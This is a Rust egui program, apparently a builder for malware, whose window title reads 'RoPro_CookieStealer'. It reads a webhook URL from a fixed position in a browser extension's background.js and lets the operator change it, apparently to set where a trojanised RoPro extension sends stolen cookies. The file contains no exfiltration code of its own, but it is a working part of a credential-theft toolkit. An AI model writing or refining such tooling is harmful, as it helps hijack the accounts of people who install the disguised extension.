use eframe::{egui, run_native};

struct MyApp {
    show_popup: bool,
    webhook: String,
    custom_webhook: String, // Для временного хранения вебхука
}

impl Default for MyApp {
    fn default() -> Self {
        Self {
            show_popup: false,
            webhook: "".to_string(),
            custom_webhook: "".to_string(), // Инициализируем временное поле
        }
    }
}

impl eframe::App for MyApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::CentralPanel::default().show(ctx, |ui| {
            if ui.button("Edit webhook").clicked() {
                self.show_popup = true;
                self.webhook = read_webhook_from_file(); // Читаем вебхук из файла
                self.custom_webhook = self.webhook.clone(); // Устанавливаем начальное значение в текстовое поле
            }

            if self.show_popup {
                egui::Window::new("webhook_popup").show(ctx, |ui| {
                    ui.label("Current webhook:");
                    ui.label(&self.webhook); // Показываем текущий вебхук

                    ui.text_edit_singleline(&mut self.custom_webhook); // Используем временное поле
                    
                    if ui.button("Set webhook [ webhook can be changed only once ] ").clicked() {
                        self.webhook = self.custom_webhook.clone(); // Сохраняем новый вебхук
                        println!("New webhook: {}", self.webhook);
                    }

                    if ui.button("Close").clicked() {
                        self.show_popup = false; // Закрываем окно
                    }
                });
            }
        });
    }
}

fn read_webhook_from_file() -> String {
    let file_path = "Extension/background.js";
    let contents = std::fs::read_to_string(file_path).unwrap_or_else(|_| {
        eprintln!("Fail to read or not found: {}", file_path);
        String::new()
    });

    let lines: Vec<&str> = contents.lines().collect();
    
    // Проверяем, что 1753-я строка существует
    if lines.len() >= 1752 {
        let line = lines[1752]; // Индекс 1753 соответствует 1753-й строке
        let start_col = 312; // 313-й символ (индексация с 0)
        let end_col = 433;   // 435-й символ (индексация с 0)

        // Убедимся, что длина строки достаточна
        if line.len() >= end_col {
            return line[start_col..end_col].to_string(); // Извлекаем подстроку
        } else {
            eprintln!("Wrong index: string less than {}", end_col);
            eprintln!("string length: {}", line.len());
        }
    } else {
        eprintln!("string 1751 not found in file.");
    }

    String::new() // Возвращаем пустую строку, если что-то пошло не так
}

fn main() {
    let options = eframe::NativeOptions {
        initial_window_size: Some(egui::vec2(400.0, 200.0)),
        ..Default::default()
    };

    run_native(
        "RoPro_CookieStealer | By: nolimanom",
        options,
        Box::new(|_ctx: &eframe::CreationContext| Box::new(MyApp::default())),
    );
}
